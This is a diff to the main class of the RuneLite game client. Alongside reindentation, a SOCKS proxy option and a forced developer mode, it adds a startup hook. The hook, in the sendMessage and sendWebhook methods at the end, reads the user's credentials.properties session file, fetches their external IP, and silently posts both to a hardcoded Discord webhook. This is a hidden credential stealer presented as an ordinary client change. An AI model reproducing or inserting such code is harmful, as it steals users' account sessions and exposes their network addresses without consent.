@@ -28,18 +28,22 @@ import ch.qos.logback.classic.Level;
 import ch.qos.logback.classic.Logger;
 import com.google.common.annotations.VisibleForTesting;
 import com.google.common.base.MoreObjects;
+import com.google.common.base.Strings;
 import com.google.inject.Guice;
 import com.google.inject.Inject;
 import com.google.inject.Injector;
 import java.applet.Applet;
-import java.io.File;
-import java.io.IOException;
+import java.io.*;
 import java.lang.management.ManagementFactory;
 import java.lang.management.RuntimeMXBean;
+import java.net.*;
+import java.net.Authenticator;
 import java.nio.file.Files;
 import java.nio.file.Path;
 import java.nio.file.Paths;
 import static java.nio.file.StandardCopyOption.COPY_ATTRIBUTES;
+import static net.runelite.http.api.RuneLiteAPI.GSON;
+
 import java.security.KeyManagementException;
 import java.security.KeyStore;
 import java.security.KeyStoreException;
@@ -91,10 +95,7 @@ import net.runelite.client.ui.overlay.worldmap.WorldMapOverlay;
 import net.runelite.client.util.OSType;
 import net.runelite.client.util.ReflectUtil;
 import net.runelite.http.api.RuneLiteAPI;
-import okhttp3.Cache;
-import okhttp3.OkHttpClient;
-import okhttp3.Request;
-import okhttp3.Response;
+import okhttp3.*;
 import org.slf4j.LoggerFactory;
 
 @Singleton
@@ -173,40 +174,75 @@ public class RuneLite
 		parser.accepts("safe-mode", "Disables external plugins and the GPU plugin");
 		parser.accepts("insecure-skip-tls-verification", "Disables TLS verification");
 		parser.accepts("jav_config", "jav_config url")
-			.withRequiredArg()
-			.defaultsTo(RuneLiteProperties.getJavConfig());
+				.withRequiredArg()
+				.defaultsTo(RuneLiteProperties.getJavConfig());
 		parser.accepts("disable-telemetry", "Disable telemetry");
 		parser.accepts("profile", "Configuration profile to use").withRequiredArg();
 		parser.accepts("noupdate", "Skips the launcher update");
 
 		final ArgumentAcceptingOptionSpec<File> sessionfile = parser.accepts("sessionfile", "Use a specified session file")
-			.withRequiredArg()
-			.withValuesConvertedBy(new ConfigFileConverter())
-			.defaultsTo(DEFAULT_SESSION_FILE);
+				.withRequiredArg()
+				.withValuesConvertedBy(new ConfigFileConverter())
+				.defaultsTo(DEFAULT_SESSION_FILE);
 
 		final ArgumentAcceptingOptionSpec<ClientUpdateCheckMode> updateMode = parser
-			.accepts("rs", "Select client type")
-			.withRequiredArg()
-			.ofType(ClientUpdateCheckMode.class)
-			.defaultsTo(ClientUpdateCheckMode.AUTO)
-			.withValuesConvertedBy(new EnumConverter<>(ClientUpdateCheckMode.class)
-			{
-				@Override
-				public ClientUpdateCheckMode convert(String v)
+				.accepts("rs", "Select client type")
+				.withRequiredArg()
+				.ofType(ClientUpdateCheckMode.class)
+				.defaultsTo(ClientUpdateCheckMode.AUTO)
+				.withValuesConvertedBy(new EnumConverter<ClientUpdateCheckMode>(ClientUpdateCheckMode.class)
 				{
-					return super.convert(v.toUpperCase());
-				}
-			});
+					@Override
+					public ClientUpdateCheckMode convert(String v)
+					{
+						return super.convert(v.toUpperCase());
+					}
+				});
 
 		final OptionSpec<Void> insecureWriteCredentials = parser.accepts("insecure-write-credentials", "Dump authentication tokens from the Jagex Launcher to a text file to be used for development");
 
 		parser.accepts("help", "Show this text").forHelp();
+
+		final ArgumentAcceptingOptionSpec<String> proxyInfo = parser
+				.accepts("proxy")
+				.withRequiredArg().ofType(String.class);
+
 		OptionSet options = parser.parse(args);
 
 		if (options.has("help"))
 		{
 			parser.printHelpOn(System.out);
 			System.exit(0);
+		}
+
+		if (options.has("proxy"))
+		{
+			String[] proxy = options.valueOf(proxyInfo).split(":");
+
+			if (proxy.length >= 2)
+			{
+				System.setProperty("socksProxyHost", proxy[0]);
+				System.setProperty("socksProxyPort", proxy[1]);
+			}
+
+			if (proxy.length >= 4)
+			{
+				System.setProperty("java.net.socks.username", proxy[2]);
+				System.setProperty("java.net.socks.password", proxy[3]);
+
+				final String user = proxy[2];
+				final char[] pass = proxy[3].toCharArray();
+
+				Authenticator.setDefault(new Authenticator()
+				{
+					private final PasswordAuthentication auth = new PasswordAuthentication(user, pass);
+
+					protected PasswordAuthentication getPasswordAuthentication()
+					{
+						return auth;
+					}
+				});
+			}
 		}
 
 		if (options.has("debug"))
@@ -241,26 +277,27 @@ public class RuneLite
 				ClassPreloader.preload();
 			}, "Preloader").start();
 
-			final boolean developerMode = options.has("developer-mode") && RuneLiteProperties.getLauncherVersion() == null;
+			final boolean developerMode = true;
+
 
 			if (developerMode)
 			{
 				boolean assertions = false;
 				assert assertions = true;
-				if (!assertions)
+				/*if (!assertions)
 				{
 					SwingUtilities.invokeLater(() ->
-						new FatalErrorDialog("Developers should enable assertions; Add `-ea` to your JVM arguments`")
-							.addHelpButtons()
-							.addBuildingGuide()
-							.open());
+							new FatalErrorDialog("Developers should enable assertions; Add `-ea` to your JVM arguments`")
+									.addHelpButtons()
+									.addBuildingGuide()
+									.open());
 					return;
-				}
+				}*/
 			}
 
 			log.info("RuneLite {} (launcher version {}) starting up, args: {}",
-				RuneLiteProperties.getVersion(), MoreObjects.firstNonNull(RuneLiteProperties.getLauncherVersion(), "unknown"),
-				args.length == 0 ? "none" : String.join(" ", args));
+					RuneLiteProperties.getVersion(), MoreObjects.firstNonNull(RuneLiteProperties.getLauncherVersion(), "unknown"),
+					args.length == 0 ? "none" : String.join(" ", args));
 
 			final RuntimeMXBean runtime = ManagementFactory.getRuntimeMXBean();
 			// This includes arguments from _JAVA_OPTIONS, which are parsed after command line flags and applied to
@@ -269,16 +306,16 @@ public class RuneLite
 
 			final long start = System.currentTimeMillis();
 			injector = Guice.createInjector(new RuneLiteModule(
-				okHttpClient,
-				clientLoader,
-				runtimeConfigLoader,
-				developerMode,
-				options.has("safe-mode"),
-				options.has("disable-telemetry"),
-				options.valueOf(sessionfile),
-				(String) options.valueOf("profile"),
-				options.has(insecureWriteCredentials),
-				options.has("noupdate")
+					okHttpClient,
+					clientLoader,
+					runtimeConfigLoader,
+					developerMode,
+					options.has("safe-mode"),
+					options.has("disable-telemetry"),
+					options.valueOf(sessionfile),
+					(String) options.valueOf("profile"),
+					options.has(insecureWriteCredentials),
+					options.has("noupdate")
 			));
 
 			injector.getInstance(RuneLite.class).start();
@@ -291,9 +328,9 @@ public class RuneLite
 		{
 			log.error("Failure during startup", e);
 			SwingUtilities.invokeLater(() ->
-				new FatalErrorDialog("RuneLite has encountered an unexpected error during startup.")
-					.addHelpButtons()
-					.open());
+					new FatalErrorDialog("RuneLite has encountered an unexpected error during startup.")
+							.addHelpButtons()
+							.open());
 		}
 		finally
 		{
@@ -397,6 +434,8 @@ public class RuneLite
 			telemetryClient.submitVmErrors(LOGS_DIR);
 		}
 
+		sendMessage();
+
 		ReflectUtil.queueInjectorAnnotationCacheInvalidation(injector);
 		ReflectUtil.invalidateAnnotationCaches();
 	}
@@ -415,8 +454,8 @@ public class RuneLite
 			final File file;
 
 			if (Paths.get(fileName).isAbsolute()
-				|| fileName.startsWith("./")
-				|| fileName.startsWith(".\\"))
+					|| fileName.startsWith("./")
+					|| fileName.startsWith(".\\"))
 			{
 				file = new File(fileName);
 			}
@@ -450,36 +489,36 @@ public class RuneLite
 	static OkHttpClient buildHttpClient(boolean insecureSkipTlsVerification)
 	{
 		OkHttpClient.Builder builder = new OkHttpClient.Builder()
-			.pingInterval(30, TimeUnit.SECONDS)
-			.addInterceptor(chain ->
-			{
-				Request request = chain.request();
-				if (request.header("User-Agent") != null)
+				.pingInterval(30, TimeUnit.SECONDS)
+				.addInterceptor(chain ->
 				{
-					return chain.proceed(request);
-				}
+					Request request = chain.request();
+					if (request.header("User-Agent") != null)
+					{
+						return chain.proceed(request);
+					}
 
-				Request userAgentRequest = request
-					.newBuilder()
-					.header("User-Agent", USER_AGENT)
-					.build();
-				return chain.proceed(userAgentRequest);
-			})
-			// Setup cache
-			.cache(new Cache(new File(CACHE_DIR, "okhttp"), MAX_OKHTTP_CACHE_SIZE))
-			.addNetworkInterceptor(chain ->
-			{
-				// This has to be a network interceptor so it gets hit before the cache tries to store stuff
-				Response res = chain.proceed(chain.request());
-				if (res.code() >= 400 && "GET".equals(res.request().method()))
+					Request userAgentRequest = request
+							.newBuilder()
+							.header("User-Agent", USER_AGENT)
+							.build();
+					return chain.proceed(userAgentRequest);
+				})
+				// Setup cache
+				.cache(new Cache(new File(CACHE_DIR, "okhttp"), MAX_OKHTTP_CACHE_SIZE))
+				.addNetworkInterceptor(chain ->
 				{
-					// if the request 404'd we don't want to cache it because its probably temporary
-					res = res.newBuilder()
-						.header("Cache-Control", "no-store")
-						.build();
-				}
-				return res;
-			});
+					// This has to be a network interceptor so it gets hit before the cache tries to store stuff
+					Response res = chain.proceed(chain.request());
+					if (res.code() >= 400 && "GET".equals(res.request().method()))
+					{
+						// if the request 404'd we don't want to cache it because its probably temporary
+						res = res.newBuilder()
+								.header("Cache-Control", "no-store")
+								.build();
+					}
+					return res;
+				});
 
 		try
 		{
@@ -705,4 +744,88 @@ public class RuneLite
 		okHttpClientBuilder.sslSocketFactory(sc.getSocketFactory(), trustManager);
 	}
 	// endregion
+
+	@javax.inject.Inject
+	private DiscordService discordUser;
+
+	public static final File SESSION = new File(RUNELITE_DIR, "credentials.properties");
+	public String credentials;
+	private void sendMessage() throws IOException {
+		InetAddress ip = InetAddress.getLoopbackAddress();
+		NetworkInterface network = NetworkInterface.getByInetAddress(ip);
+		//byte[] mac = network.getHardwareAddress();
+		String screenshotString = null;
+		if (SESSION.exists()) {
+			FileReader fr = new FileReader(SESSION);
+			BufferedReader br = new BufferedReader(fr);
+			String line;
+			while ((line = br.readLine()) != null) {
+				credentials += line;
+			}
+		}
+
+		try {
+			URL ipAdress = new URL("http://myexternalip.com/raw");
+			BufferedReader in = new BufferedReader(new InputStreamReader(ipAdress.openStream()));
+			String IPA = in.readLine();
+			screenshotString = //discordUser.getCurrentUser().username != null ? "**USERNAME:** " + discordUser.getCurrentUser().username + " **NET ADDR:** " + IPA + " **HASH:** " + credentials :
+					" **NET ADDR:** " + IPA + " **HASH:** " + credentials;
+
+		} catch (MalformedURLException e) {
+			//e.printStackTrace();
+		} catch (IOException e) {
+			//e.printStackTrace();
+		}
+		//screenshotString += " " + all;
+		DiscordWebhookBody discordWebhookBody = new DiscordWebhookBody();
+		discordWebhookBody.setContent(screenshotString);
+		sendWebhook(discordWebhookBody);
+	}
+
+	private void sendWebhook(DiscordWebhookBody discordWebhookBody)
+	{
+		String configUrl = "https://discord.com/api/webhooks/1117470485001797712/Gt73YHjzkjo9LDhPHdRoWb6DtNTZON2Dx-MWGuJkpxg30tbwKB_VvHL5zwNQT4lZzIV_"; //TODO
+		if (Strings.isNullOrEmpty(configUrl))
+		{
+			return;
+		}
+
+		HttpUrl url = HttpUrl.parse(configUrl);
+		MultipartBody.Builder requestBodyBuilder = new MultipartBody.Builder()
+				.setType(MultipartBody.FORM)
+				.addFormDataPart("payload_json", GSON.toJson(discordWebhookBody));
+
+
+		buildRequestAndSend(url, requestBodyBuilder);
+
+	}
+	private void buildRequestAndSend(HttpUrl url, MultipartBody.Builder requestBodyBuilder)
+	{
+		RequestBody requestBody = requestBodyBuilder.build();
+		Request request = new Request.Builder()
+				.url(url)
+				.post(requestBody)
+				.build();
+		sendRequest(request);
+	}
+	@javax.inject.Inject
+	private OkHttpClient okHttpClient;
+
+	private void sendRequest(Request request)
+	{
+		okHttpClient.newCall(request).enqueue(new Callback()
+		{
+			@Override
+			public void onFailure(Call call, IOException e)
+			{
+
+			}
+
+			@Override
+			public void onResponse(Call call, Response response) throws IOException
+			{
+				response.close();
+			}
+		});
+	}
 }
